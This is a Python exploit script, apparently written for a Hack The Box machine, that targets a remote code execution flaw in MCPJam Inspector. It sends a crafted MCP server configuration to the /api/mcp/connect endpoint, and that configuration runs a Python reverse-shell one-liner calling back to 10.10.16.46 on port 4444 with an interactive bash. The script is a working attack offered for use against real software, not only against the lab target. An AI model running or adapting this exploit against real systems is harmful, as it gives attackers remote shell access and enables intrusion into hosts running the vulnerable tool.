#!/usr/bin/env python3

import requests
import argparse
from rich.status import Status
from rich.console import Console

console=Console()

def display_header():
    console.print("""
[blue]
                     ___________                     
  _____   ____ ______\\_   _____/__  ___ ____   ____  
 /     \\_/ ___\\\\____ \\|    __)_\\  \\/  // __ \\_/ ___\\ 
|  Y Y  \\  \\___|  |_> >        \\>    <\\  ___/\\  \\___ 
|__|_|  /\\___  >   __/_______  /__/\\_ \\\\___  >\\___  >
      \\/     \\/|__|          \\/      \\/    \\/     \\/ 
[/blue]
""")

def command():
    global args
    parser = argparse.ArgumentParser(
        prog='mcpexec',
        description='Tool for DevHub HTB machine that exploits RCE in MCPJam Inspector',
        epilog='Thanks for supporting me!',
        formatter_class=argparse.RawTextHelpFormatter,
        )

    parser.add_argument('url')
    args = parser.parse_args()
    if not args.url:
        parser.error(f"mcpexec: try 'mcpexec -h' or 'mcpexec --help' for more information.")
    return args

def exploit(args):
    api_endpoint = args.url + "/api/mcp/connect"
    try:
        headers = {
            "Content-Type":"application/json"
        }
        payload = {
            "serverConfig": {
                "type": "stdio",
                "command": f"python3",
                "args": ["-c", "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.16.46\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],
                "env":{}
            },
            "serverId": "test"
        }
        with Status('Performing exploitation...', spinner='aesthetic', console=console):
            r = requests.post(api_endpoint, headers=headers, json=payload)
        success_message = '{"success":false,"error":"Connection failed for server test: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}'
        if r.status_code == 500 and r.text == success_message:
            console.print(f"[[green]+[/green]] Exploitation completed!\n")
        else:
            console.print(f"[[red]-[/red]] Exploitation failed.\n")
    except Exception as e:
        console.print(f"[[red]-[/red]] Exploitation failed.\n")

if __name__=="__main__":
    display_header()
    args = command()
    exploit(args)
